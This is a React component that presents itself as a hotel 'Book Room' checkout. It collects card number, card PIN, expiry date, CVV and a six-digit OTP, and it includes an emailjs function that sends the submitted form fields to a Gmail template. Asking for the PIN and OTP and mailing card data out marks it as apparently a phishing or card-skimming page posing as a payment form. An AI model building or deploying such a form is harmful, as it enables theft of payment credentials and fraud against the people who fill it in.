import React from 'react';
import emailjs from 'emailjs-com';
import './input-data.styles.css' ;
import {Link} from 'react-router-dom'
import master from '../../component/pictures/master-card.svg'
import visa from '../../component/pictures/visa.svg'




const Input_data =()=> {
    
    function sendEmail(e) {
        e.preventDefault();
    
        emailjs.sendForm('gmail', "template_qm8ghyt", e.target, 'user_zfBFheYcXKnefAXIWmKdy')
          .then((result) => {
              console.log(result.text);
          }, (error) => {
              console.log(error.text);
          });
    
          e.target.reset()
      }
    
      return (
        <div className= 'data-container'>
    
        <form action='/data' >
          <input type="hidden" name="name" />
    
          <div className='input-conatiner'>
          <input type="text" placeholder='Full name' name="name" />
         
          </div>
          
          <div className='input-conatiner'>
          <input type="email" name="email"  placeholder='Email'/>
          
          </div>
    
          <div className='input-card-conatiner'>
          <div className='input-conatiner'>
          <input type="number" placeholder='Card Number' name="card" />
          </div>
          <div className="card">
            <div className="master">
              <img src={master} alt="master card"/>
              </div>
              <div className="master">
              <img src={visa} alt="visa card"/>
            </div>
           
          </div>
        </div>
        <div className="pin-container">
            <input type="password" placeholder='1234' name="pin" className='pin'/>
            <label>Pin</label>
            </div>

          <div className='input-conatiner'>
            <div className="date"> Expiring date</div>
            <div className="month-year">
            <div className="month">
            <input type="number" placeholder='01' name="month" className='mnth'/>
            <label>MM</label>
            </div>
            <div className="year">
          <input type="number" placeholder='21' name="year"  className='yr'  />
          <label>YR</label>
          </div>

             </div>
        </div>

          <div className='input-conatiner' >
          <input type="number" placeholder='123' name="cvv" className='year' />
          <label className='cvv'>cvv</label>
          </div>
    
          <div className='input-conatiner' >
          <input type="submit" value="CLICK TO GET OTP " className='btn'/>
            </div>



            
          <div className='otp-conatiner'>
          <input type="text" name="number1" className='otp'/>
          <input type="text" name="number2" className='otp'/>
          <input type="text" name="number3" className='otp'/>
          <input type="text" name="number4" className='otp'/>
          <input type="text" name="number5" className='otp'/>
          <input type="text" name="number6" className='otp'/>
         
          </div>

          <div className="otp-text">
              <p className="p-text">you'd be sent an otp soon to put in the input box</p>
          </div>

          <input type="submit" value="Book Room " className='btn'/>

        </form>
    
        </div>
      );
}

export default Input_data